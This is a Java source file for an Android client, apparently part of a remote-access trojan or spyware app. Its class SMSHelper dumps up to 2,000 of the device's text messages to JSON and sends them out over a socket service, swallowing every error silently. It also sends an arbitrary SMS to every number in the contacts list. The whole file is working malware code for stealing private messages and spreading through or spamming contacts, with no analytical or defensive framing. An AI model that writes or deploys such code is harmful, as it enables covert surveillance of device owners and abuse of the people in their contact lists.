package com.rainbow.client;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.provider.ContactsContract;

import org.json.JSONArray;
import org.json.JSONObject;

public class SMSHelper {

    public static void dumpAll(Context ctx) {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = ctx.getContentResolver().query(
                    Uri.parse("content://sms"), null, null, null, "date DESC");
            if (c != null) {
                while (c.moveToNext() && arr.length() < 2000) {
                    JSONObject o = new JSONObject();
                    o.put("address", c.getString(c.getColumnIndexOrThrow("address")));
                    o.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                    o.put("date", c.getLong(c.getColumnIndexOrThrow("date")));
                    o.put("type", c.getInt(c.getColumnIndexOrThrow("type")));
                    arr.put(o);
                }
                c.close();
            }
            SocketService2.sendFile("all-sms.json", arr.toString().getBytes());
        } catch (Exception ignored) {}
    }

    public static void dumpEmails(Context ctx) {}

    public static void send(Context ctx, String number, String text) {
        try {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(number, null, text, null, null);
        } catch (Exception ignored) {}
    }

    public static void sendAllContacts(Context ctx, String text) {
        try {
            Cursor c = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String num = c.getString(c.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    if (num != null) send(ctx, num, text);
                }
                c.close();
            }
        } catch (Exception ignored) {}
    }

    public static void textAllContacts(Context ctx, String text) {
        sendAllContacts(ctx, text);
    }
}